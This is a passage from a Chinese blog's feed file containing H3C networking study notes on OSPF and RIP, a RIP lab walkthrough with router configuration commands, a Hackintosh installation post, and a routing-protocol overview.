class="code"><pre><span class="line">[R2]display ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 20       Routes : 21</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">0.0.0.0/0          O_ASE2  150 1           10.1.1.1        GE0/0</span><br><span class="line">……</span><br><span class="line">192.168.1.0/24     O_INTRA 10  2           10.3.3.3        GE0/1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R3]display ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 23       Routes : 23</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">0.0.0.0/0          O_ASE2  150 1           10.3.3.2        GE0/1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态路由协议OSPF</title>
      <link href="/posts/48052"/>
      <url>/posts/48052</url>
      
        <content type="html"><![CDATA[<br /><hr><br /><p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E9%9B%84%E5%B8%88%E5%B0%91%E5%B9%B49.jpg"></p><br /><hr><h2 id="NE阶段内容"><a href="#NE阶段内容" class="headerlink" title="NE阶段内容"></a>NE阶段内容</h2><br /><br /><h3 id="RIP的缺陷"><a href="#RIP的缺陷" class="headerlink" title="RIP的缺陷"></a>RIP的缺陷</h3><ul><li><code>最大跳数限制了网络规模</code></li><li><code>以跳数为度量无法准确判断最优路径</code></li><li><code>路由更新发送完整路由表消耗网络带宽</code></li><li><code>收敛速度慢</code></li><li><code>协议会产生路由自环</code></li></ul><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><code>开放式最短路径优先，基于链路状态特征</code></li><li><code>工作在IP层，协议号89</code></li></ul><h3 id="OSPF初始化流程"><a href="#OSPF初始化流程" class="headerlink" title="OSPF初始化流程"></a>OSPF初始化流程</h3><p><strong>1.建立邻居和邻接关系</strong></p><ul><li><em>发送hello报文发现和建立邻居关系，组播地址224.0.0.5</em><ul><li><code>接口UP</code></li><li><code>双方接口IP地址在同一网段</code></li><li><code>双方接口在同一区域</code></li></ul></li><li><em>选举DR&#x2F;BDR，建立邻接关系</em><ul><li><em>DR&#x2F;BDR选举</em><ul><li><em>选举原因</em>：<code>广播网络 中使路由信息交换更加高速有序</code></li><li><em>选举范围</em>：<code>每条广播链路上都需要选举出一个DR和BDR</code></li><li><em>选举规则</em><ul><li><code>优先级数字大的优先默认优先级都是1</code></li><li><code>Router-id大的优先</code></li></ul></li><li><em>Router-id</em><ul><li><em>定义</em>：<code>Rid，标识路由器身份</code></li><li><em>产生方法</em><ul><li><code>手动配置一个IPv4地址格式作为Rid</code></li><li><em>自动选举</em><ul><li><code>1.在所有环回口中选举IP地址最大的作为Rid</code></li><li><code>2.在所有物理接口中选举IP地址最大的作为Rid</code></li></ul></li></ul></li><li><em>建议手动配置一个本地环回口的IP地址作为Rid</em></li></ul></li></ul></li><li>关系状态<ul><li><code>DRother与DR建立邻接关系。DRother(其他路由器既不是DR，又不是BDR)</code></li><li><code>DRother与BDR建立邻接关系</code></li><li><code>DR与BDR建立邻接关系</code></li><li><code>两个DRother之间保持邻居关系</code></li></ul></li></ul></li></ul><p><strong>2.邻接路由之间交换链路状态信息，实现区域内链路状态数据库同步</strong></p><ul><li><em>相关概念</em><ul><li><em>链路状态通告</em><ul><li><code>LSA</code></li><li><code>用来描述路由器的接口、路由条目的相关信息</code></li></ul></li><li><em>链路状态数据库</em><ul><li><code>LSDB</code></li><li><code>存储本地所有LSA</code></li></ul></li></ul></li><li><em>工作流程</em><ul><li><code>1.向邻接路由发送DD(数据库描述)报文，通告本地LSDB中所有LSA的摘要信息</code></li><li><code>2.收到DD后，与本地LSDB对比，向对方发送LSR(链路状态请求) 报文，请求本地所需的LSA的完整信息</code></li><li><code>3.收到LSR后，把对方所需的LSA的完整信息打包为一条LSU(链路状态更新)报文，发送至对方</code></li><li><code>4.收到LSU后，向对方回复LSAck报文，进行确认</code></li></ul></li></ul><p><strong>3.每台路由器根据本机链路状态数据库，计算到达每个母的网段的最优路由，写入路由器</strong></p><h4 id="OSPF报文类型"><a href="#OSPF报文类型" class="headerlink" title="OSPF报文类型"></a>OSPF报文类型</h4><ul><li><strong>Hello报文</strong></li><li><strong>DD报文             数据库描述报文，用于描述本地LSDB所有的LSA的摘要</strong></li><li><strong>LSR报文            链路状态请求</strong></li><li><strong>LSU报文            链路状态更新</strong></li><li><strong>LSAck报文         链路状态确认</strong></li></ul><h3 id="OSPF分区域管理"><a href="#OSPF分区域管理" class="headerlink" title="OSPF分区域管理"></a>OSPF分区域管理</h3><p><em>分区域的原因</em></p><ul><li><code>加快收敛速度</code></li><li><code>把网络故障隔离在区域内部</code></li></ul><p><em>路由器角色</em></p><ul><li><code>IR内部路由器，所有接口都处于同一个区域</code></li><li><code>ABR区域边界路由器，连接不同区域的路由器</code></li><li><code>ASBR自治系统边界路由器，连接外部自治系统的路由器</code></li></ul><p><em>区域类型</em> </p><ul><li><em>骨干区域</em><ul><li><code>只能有一个骨干区域，一般是区域0</code></li><li><code>骨干区域必须是连续的</code></li></ul></li><li><em>非骨干区域</em>        <ul><li><code>非骨干区域必须连接到骨干区域</code></li><li><code>为了防止区域间形成路由环路</code></li></ul></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>[h3c]ospf &#39;process id&#39; &#39;router-id&#39; &#39;rid&#39;//开启OSPF进程，指定Router-id，进入OSPF协议视图</code></p><p><code>[h3c-ospf-1]area &#39;area id&#39;//进入区域视图</code></p><p><code>[h3c-ospf-1-area 0.0.0.0]network &#39;ip address&#39; &#39;wild -mask&#39;//宣告网段</code></p><ul><li><code>‘wlid-mask’   掩码通配符，0对应的部分需要匹配一致，1对应的部分不检查</code></li></ul><p><code>[h3c-ospf-1]silent-interface &#39;interface id&#39;//配置静默接口</code></p><p><code>[h3c-GigabitEthernet 0/0] ospf dr-pririty &#39;priotity&#39;//修改OSPF接口优先级</code></p><p><code>[h3c-GigabitEthernet 0/0]ospf cost &#39;cost&#39;//修改接口OSPF开销</code></p><p><code>&lt;h3c&gt; reset ospf &#39;process id&#39; process//重置OSPF进程</code></p><p><code>[h3c]display ospf peer//查看OSPF邻居关系</code></p><ul><li><code>FULL：邻接关系2-Way：邻居关系</code></li></ul><p><code>[h3c]display ospf lsdb//查看OSPF链路状态数据库</code></p><p><code>[h3c]display ospf routing//查看OSPF路由</code></p><h2 id="SE阶段内容"><a href="#SE阶段内容" class="headerlink" title="SE阶段内容"></a>SE阶段内容</h2><br /><br /><h3 id="OSPF基本原理"><a href="#OSPF基本原理" class="headerlink" title="OSPF基本原理"></a>OSPF基本原理</h3><h4 id="OSPF的三张表"><a href="#OSPF的三张表" class="headerlink" title="OSPF的三张表"></a>OSPF的三张表</h4><ul><li>邻居表<em>记录邻居状态和关系</em></li><li>拓扑表<em>链路状态数据库</em></li><li>路由表<em>记录由SPF算法计算的路由</em></li></ul><h4 id="OSPF路由器类型"><a href="#OSPF路由器类型" class="headerlink" title="OSPF路由器类型"></a>OSPF路由器类型</h4><ul><li>区域内路由器IR，所有接口都在同一区域</li><li>骨干路由器BR，有接口在骨干区域</li><li>区域边界路由器ABR，连接骨干区域和非骨干区域</li><li>自治系统边界路由器ASBR，连接外部自治系统，并引入外部路由</li></ul><h4 id="OSPF网络类型"><a href="#OSPF网络类型" class="headerlink" title="OSPF网络类型"></a>OSPF网络类型</h4><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><ul><li>对于不同的二层链路类型的网段，OSPF会生成不同的网络类型</li><li>不同的网络类型，DR&#x2F;BDR选举，LSA细节，协议报文发送形式等会有所不同</li></ul><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p><em>Broadcast</em>：</p><ul><li>广播网络，以太网默认的网络类型</li><li>组播发送协议报文：224.0.0.5所有运行OSPF的接口会监听    224.0.0.6所有DR&#x2F;BDR的接口会监听</li><li>需要选举DR&#x2F;BDR</li><li>hello  time      10秒</li><li>dead-time       40秒</li></ul><p><em>NBMA</em></p><ul><li>非广播多点可达，帧中继默认的网络类型</li><li>单播发送协议报文，需要手动指定邻居</li><li>需要选举DR&#x2F;BDR</li><li>hello-time30秒</li><li>dead-time120秒</li></ul><p><em>P2MP</em></p><ul><li>点到多点网络，由其他网络类型手动更改</li><li>模拟组播发送协议报文，可以自动发现邻居</li><li>不选举DR&#x2F;BDR</li><li>hello-time30秒</li><li>dead-time120秒</li></ul><p><em>P2P</em></p><ul><li>点到点网络，PPP默认的网络类型</li><li>组播发送协议报文</li><li>不选举DR&#x2F;BDR</li><li>hello-time10秒</li><li>dead-time40秒</li></ul><h4 id="OSFP邻接建立过程"><a href="#OSFP邻接建立过程" class="headerlink" title="OSFP邻接建立过程"></a>OSFP邻接建立过程</h4><p><em><strong>Down</strong></em><code>关闭状态（稳定状态）</code></p><p><em><strong>Init</strong></em><code>单方发现状态</code></p><p><code>收到了对方的Hello报文，但没有收到对方的hello确认报文</code></p><p><em><strong>Attempt</strong></em><code>只会出现NBMA网络中</code></p><p><code>发出了Hello包，但未收到对方的hello包</code></p><p><em><strong>2-way</strong></em><code>邻居状态（稳定状态）</code></p><p><code>邻居双方互相发现，并确认了DR/BDR角色：</code></p><ul><li><code>当选举完毕，就算出现一台更高优先级的路由器，也不会替换成为新的DR/BDR</code></li><li><code>需要原DR/BDR失效，或者重置OSPF进程才会成为新的DR/BDR</code></li></ul><p><em>2-way的前提</em>：<code>Router-id无冲突修改Router-id需要重置OSPF进程使生效</code></p><p><code>掩码长度一致</code>、<code>区域ID一致</code>、<code>验证密码一致</code>、<code>hello-time一致</code>、<code>dead-time一致</code></p><p><em><strong>Exstart</strong></em><code>交换开始状态</code></p><p><code>发送第一个DD报文：不转发LSDB摘要、仅用于确认LSA传递的主从</code></p><p><em>DD报文置位符：</em></p><p>​<code>IInit位、置位则表示此报文是第一个DD报文</code></p><p>​<code>M  more位、置位则表示还有后续DD报文</code></p><p>​<code>MSmaster位、置位则表示本端为主</code></p><p><em><strong>Exchange</strong></em><code>交换状态、发送后续DD报文，用于通告LSDB摘要</code></p><p><em><strong>Loading</strong></em><code>读取状态、进行LSA的请求、加入和确认</code></p><p><em><strong>Full</strong></em>邻<code>接状态（稳定状态）、两端LSDB同步</code></p><p><em>Full的前提：</em></p><p><code>两端网络类型一致否则邻居状态FULL，但无法学习路由</code></p><p><code>两端MTU一致否则邻居状态卡在Exstart、Exchange</code></p><h4 id="LSDB更新"><a href="#LSDB更新" class="headerlink" title="LSDB更新"></a>LSDB更新</h4><p><strong>更新流程</strong></p><p><code>I.收到LSA更新后，在本地LSDB中查询此LSA，未查到则加入LSDB</code></p><p><code>II.查到此LSA，则把收到的LSA和本地LSA进行序列号对比</code></p><p><code>III.如本地LSA序列号大，则丢弃更新，否则加入LSDB</code></p><h4 id="OSPF开销计算"><a href="#OSPF开销计算" class="headerlink" title="OSPF开销计算"></a>OSPF开销计算</h4><p><em>参考带宽</em></p><ul><li><code>计算开销的基准带宽值</code></li><li><code>默认参考带宽是100M</code></li><li><code>建议把网络中最高的链路带宽设置为参考带宽</code></li></ul><p><em>计算方法</em></p><p><code>链路带宽大于等于参考带宽cost=1</code></p><p><code>链路带宽小于参考带宽cost=参考带宽、链路带宽（MB）</code></p><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[h3c]router-id &#x27;router-id&#x27;#配置全局Router-id的优先级更高，协议内指定router-id的优先级更高</span><br><span class="line">[h3c]display ospf interface #查看OSPF接口信息，网络类型通过此命令查看</span><br><span class="line">[h3c]display ospf routing#查看OSPF路由信息，可以查看路由所属区域和发布者</span><br><span class="line">[h3c]display ospf statistics error#查看OSPF报错信息</span><br><span class="line">[h3c]display ospf lsdb#查看本地LSDB汇总信息</span><br><span class="line">[h3c-GigabitEthernet0/0]ospf network-type &#x27;broadcast/nmba/p2mp/p2p&#x27;#配置接口网络类型</span><br><span class="line">[h3c-GigabitEthernet0/0]ospf timer hello &#x27;seconds&#x27;#配置接口HELLO时间</span><br><span class="line">[h3c-GigabitEthernet0/0]ospf timer dead &#x27;seconds&#x27;#配置接口DEAD时间</span><br><span class="line">[h3c-ospf-1]Bandwidth-reference &#x27;value&#x27;#配置参考带宽</span><br><span class="line">[h3c-ospf-1]default-route-advertise#将已经存在的默认路由引入到OSPF</span><br><span class="line">[h3c-ospf-1]default-route-adverise always#自动产生一条默认路由LSA下发到OSPF</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑苹果部署</title>
      <link href="/posts/621"/>
      <url>/posts/621</url>
      
        <content type="html"><![CDATA[<br /><br /><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/02.jpg"></p><h3 id="配置详情"><a href="#配置详情" class="headerlink" title="配置详情"></a>配置详情</h3><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/01.jpg"></p><h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p><em>准备一个<code>U盘</code>，将镜像写入<code>U盘</code></em></p><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/03.jpg"></p><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/04.jpg"></p><h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><p>注入准备好的EFI文件</p><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/05.jpg"><em>已安装完毕分区</em></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/06.jpg"><em>跑代码</em></p><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/07.jpg"></p><h3 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h3><p><img src="/images/%E9%BB%91%E8%8B%B9%E6%9E%9C%E9%83%A8%E7%BD%B2/08.jpg"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>原瑞昱无线网卡没有黑苹果驱动无法开启Wifi和蓝牙换成Intel AX210有驱动可以注入可以正常使用</code></p><p><code>安装黑苹果需要定制EFI引导文件,同配置可联系获取</code></p><p><code>当前EFI存在问题：</code></p><ul><li><code>显示器内置音响播放有杂音，无法正常使用</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑苹果 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RIP实验</title>
      <link href="/posts/51215"/>
      <url>/posts/51215</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/RIP%E5%AE%9E%E9%AA%8C/01.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><ol><li>按照图示配置 IP 地址</li><li>配置 RIP 实现全网路由互通</li><li>要求全网路由器不能出现明细路由（直连网段除外），不影响网络正常访问</li><li>业务网段不允许出现协议报文</li><li>R1 和 R2 之间需要开启接口身份验证来保证协议安全性，密钥为 <code>runtime</code></li></ol><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>1.<strong>配置 IP 地址部分略</strong></p><p>2.<strong>配置 RIP 实现全网路由互通</strong></p><p>　　<em>分析：实现全网互通，意味着每台路由器都要宣告本地的所有直连网段。RIP 只能做主类宣告，以 R1 为例，连接的两个业务网段属于同一个 B 类主类网段划分出的子网，所以只用宣告一次；而且为了不造成路由环路，需要开启 RIP v2 版本，以支持 VLSM；R3 同理</em><br>　　<br><em>步骤 1：在 R1，R2，R3 上分别配置 RIP v2，关闭自动聚合，并宣告所有直连网段</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]rip 1</span><br><span class="line">[R1-rip-1]version 2</span><br><span class="line">[R1-rip-1]undo summary</span><br><span class="line">[R1-rip-1]network 172.16.0.0</span><br><span class="line">[R1-rip-1]network 192.168.1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R2]rip 1</span><br><span class="line">[R2-rip-1]version 2</span><br><span class="line">[R2-rip-1]undo summary</span><br><span class="line">[R2-rip-1]network 192.168.1.0</span><br><span class="line">[R2-rip-1]network 192.168.2.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R3]rip 1</span><br><span class="line">[R3-rip-1]version 2</span><br><span class="line">[R3-rip-1]undo summary</span><br><span class="line">[R3-rip-1]network 172.16.0.0</span><br><span class="line">[R3-rip-1]network 192.168.2.0</span><br></pre></td></tr></table></figure><p><em>步骤 2:在路由器上查看路由表，发现已经学习到了全网明细路由（详细省略）</em></p><p>3.<strong>要求全网路由器不能出现明细路由（直连网段除外），不影响网络正常访问</strong></p><p>　<em>分析：上一步中的 RIP 已经配置完成，但路由器学习到的都是各网段的明细路由。在网络结构庞大的拓扑中，明细路由太多会导致路由器查表效率降低，所以需要配置路由聚合来减少路由数量<br>　RIP 的聚合方式分为自动聚合和手动聚合。自动聚合是聚合为主类网段，在本拓扑中会造成路由环路，所以只能使用手动聚合<br>　R1 连接的 2 个业务网段的路由可以聚合为一条 <code>172.16.0.0/23</code>，R3连接的 2 个业务网段的路由可以聚合为一条 <code>172.16.2.0/23</code>，在各自的路由传递的出接口上配置手动聚合</em><br>　<br><em>步骤 1：在 R1 的 g0&#x2F;0 接口配置手动路由聚合</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-GigabitEthernet0/0]rip summary-address 172.16.0.0 23</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R3 的 g0&#x2F;0 接口配置手动路由聚合</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R3-GigabitEthernet0/0]rip summary-address 172.16.2.0 23</span><br></pre></td></tr></table></figure><p><em>步骤 3：在 R2 上查看路由表，发现学习到的是 R1 和 R3 发布的聚合路由</em></p><p>　　<em>注意：基于 RIP 的工作原理，旧的明细路由需要一定时间延迟才会从路由表中彻底删除</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[R2]display ip routing-table </span><br><span class="line"></span><br><span class="line">Destinations : 20       Routes : 20</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">……</span><br><span class="line">172.16.0.0/23      RIP     100 1           192.168.1.1     GE0/0</span><br><span class="line">172.16.2.0/23      RIP     100 1           192.168.2.3     GE0/1</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>4.<strong>业务网段不允许出现协议报文</strong></p><p>　　<em>分析：基于 <code>network</code> 命令的两层含义，R1 和 R3 对直连的业务网段进行宣告后，会往该网段发送 RIP 的协议报文。这些协议报文是完全没有意义的，还会消耗网络带宽，所以需要配置静默接口</em><br>　　<br><em>步骤 1：把 R1 连接业务网段的 g0&#x2F;1 和 g0&#x2F;2 接口配置为静默接口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R1-rip-1]silent-interface g0/1</span><br><span class="line">[R1-rip-1]silent-interface g0/2</span><br></pre></td></tr></table></figure><p><em>步骤 2：把 R3 连接业务网段的 g0&#x2F;1 和 g0&#x2F;2 接口配置为静默接口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[R3-rip-1]silent-interface g0/1</span><br><span class="line">[R3-rip-1]silent-interface g0/2</span><br></pre></td></tr></table></figure><p>5.<strong>R1 和 R2 之间需要开启接口身份验证来保证协议安全性，密钥为 <code>runtime</code></strong></p><p><em>步骤 1：在 R1 的 g0&#x2F;0 接口配置接口验证，密钥 <code>runtime</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-GigabitEthernet0/0]rip authentication-mode simple plain runtime</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R2 的 g0&#x2F;0 接口配置接口验证，密钥必须和 R1 一致</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R2-GigabitEthernet0/0]rip authentication-mode simple plain runtime</span><br></pre></td></tr></table></figure><p>　　<em>说明：通过重置 RIP 进程观察是否能够学习到路由来判断接口验证是否通过</em></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态路由协议-RIP</title>
      <link href="/posts/40304"/>
      <url>/posts/40304</url>
      
        <content type="html"><![CDATA[<br /><br /><p> RIP：Routing Information Protocol（路由信息协议）</p><h2 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><code>路由信息协议，基于距离矢量算法</code></p><p><code>基于UDP端口520</code></p><h3 id="RIP初始化流程"><a href="#RIP初始化流程" class="headerlink" title="RIP初始化流程"></a>RIP初始化流程</h3><p><code>1.RIP运行后，会从每个参与协议的接口上以广播形式发送路由请求</code></p><p><code>2.收到路由请求后，将自己完整的路由表以广播形式响应</code></p><p><code>3.收到路由响应后，根据计算规则，把路由写入到路由表</code></p><p><code>4.路由信息会按照发送方向逐跳扩散</code></p><h3 id="路由信息更新"><a href="#路由信息更新" class="headerlink" title="路由信息更新"></a>路由信息更新</h3><p><code>路由响应报文会以30秒为周期发送，以对网络变化进行更新</code></p><h3 id="RIP环路问题"><a href="#RIP环路问题" class="headerlink" title="RIP环路问题"></a>RIP环路问题</h3><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><p><code>1.链路故障，导致路由从表中删除</code></p><p><code>2.30秒的更新周期还未到来，提前收到了邻居传递过来的刚刚被删除的路由，形成环路</code></p><h4 id="防环机制"><a href="#防环机制" class="headerlink" title="防环机制"></a>防环机制</h4><p><strong>水平分割</strong>：<code>从某个接口收到的路由信息不会从该接口回传</code></p><p><strong>毒性逆转</strong>：<code>从某个接口收到的路由信息会设置为16跳后回传</code></p><p><strong>路由毒化</strong>：<code>当路由失效，标记为16跳，并通告邻居，使邻居及时使该路由失效</code></p><p><strong>抑制计时器</strong>：<code>计时时间内，不接收和原路由跳数一致或更高的路由更新</code></p><p><strong>触发更新</strong>：<code>当路由失效，不用等待更新周期，立即发出路由更新，来通告错误</code></p><p><strong>最大跳数</strong>：<code>不接收跳数大于15跳的路由更新</code></p><h4 id="RIP计时器"><a href="#RIP计时器" class="headerlink" title="RIP计时器"></a>RIP计时器</h4><p>更新计时器：<code>30秒</code></p><p>失效计时器：</p><ul><li><code>180秒</code></li><li><code>路由打上possibly down(失效)标签，路由设置为16跳</code></li></ul><p>刷新计时器：</p><ul><li><code>120秒</code></li><li><code>彻底删除路由</code></li></ul><p>抑制计时器：</p><ul><li><code>180秒</code></li><li><code>当一条路由信息失效，被打上PD标签</code></li><li><code>从其他接口收到比原路由更差的路由更新</code></li></ul><h3 id="RIPv2"><a href="#RIPv2" class="headerlink" title="RIPv2"></a>RIPv2</h3><ul><li><code>报文以组播发送，组播地址224.0.0.9</code></li><li><code>路由更新携带子网掩码</code></li><li><code>可以关闭自动聚合，支持手动聚合</code></li><li><code>支持身份验证</code></li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><code>[h3c]rip &#39;process id&#39;创建RIP进程，进入RIP协议视图</code></p><p><code>[h3c-rip-1]version 2更改RIP版本为V2</code></p><p><code>[h3c-rip-1]undo summary关闭自动聚合</code></p><p><code>[h3c-rip-1]network &#39;network&#39;</code></p><ul><li><code>宣告接口</code><ul><li><code>需要通过该接口与对方邻居传递路由。</code></li><li><code>该接口所在网段的路由需要传递出去给邻居学习</code></li></ul></li><li><code>network命令的2层功能</code><ul><li><code>使能接口</code><ul><li><code>每个接口的IP地址与宣告的网段进行匹配，被匹配的接口能够收发RIP协议报文</code></li></ul></li><li><code>使能路由</code><ul><li><code>每个接口的IP地址与宣告的网段进行匹配，被匹配的接口所产生的直连路由能够传递给邻居</code></li></ul></li></ul></li></ul><p><code>[h3c-rip-1]silent-interface &#39;interface number&#39;配置静默接口。静默接口上不会发送RIP协议报文</code></p><p><code>[h3c-GigabitEthernet 0/0]rip authentication mode配置RIP接口身份验证</code></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由协议概述</title>
      <link href="/posts/51527"/>
      <url>/posts/51527</url>
      
        <content type="html"><![CDATA[<br /><h2 id="路由协议概述"><a href="#路由协议概述" class="headerlink" title="路由协议概述"></a>路由协议概述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><em>路由协议</em><code>用来计算、维护网络路由信息的协议</code></li></ul><h3 id="路由协议的功能"><a href="#路由协议的功能" class="headerlink" title="路由协议的功能"></a>路由协议的功能</h3><ul><li><em><strong>邻居发现</strong></em>：<code>路由器通过发送广播报文或发送给指定的路由器邻居以主动把自己介绍给网段内的其它路由器</code></li><li><em><strong>路由交换</strong></em>：<code>每台路由器将自己已知的路由相关信息发给相邻路由器</code></li><li><em><strong>路由计算</strong></em>：<code>每台路由器运行某种算法，计算出最终的路由来</code></li><li><em><strong>路由维护</strong></em>：<code>路由器之间通过周期性地发送协议报文来维护邻居信息</code></li></ul><h3 id="路由协议的分类"><a href="#路由协议的分类" class="headerlink" title="路由协议的分类"></a>路由协议的分类</h3><p><em>按照使用位置分类</em></p><ul><li><p><code>IGP内部网关协议</code>     </p><ul><li><code>运行在自治系统内部的路由协议</code></li><li><code>RIP、OSPF、IS-IS</code></li><li><code>通俗来说IGP把内部跑通的协议</code></li></ul></li><li><p><code>EGP   外部网关协议</code></p><ul><li><code>运行在自治系统之间的路由协议</code></li><li><code>BGP</code></li><li><code>通俗来说EGP把多个自治系统之间进行传递</code></li></ul></li></ul><p><em>自治系统</em></p><ul><li><code>autonomous system</code> ：AS</li><li><code>一组被统一管理，运行同一个IGP的路由器组成的网络范围</code></li><li><code>一般不同城域网都是不同的AS，不同运营商也是不同的AS</code></li></ul><h3 id="按照协议算法分类"><a href="#按照协议算法分类" class="headerlink" title="按照协议算法分类"></a>按照协议算法分类</h3><p>距离矢量协议</p><ul><li><code>度量值是条路</code></li><li><code>RIP</code></li></ul><p>链路状态协议</p><ul><li><code>度量值是开销</code></li><li><code>OSPF、IS-IS</code></li></ul><p>路径矢量协议</p><ul><li><code>有多种度量值</code></li><li><code>BGP</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态路由实验</title>
      <link href="/posts/6029"/>
      <url>/posts/6029</url>
      
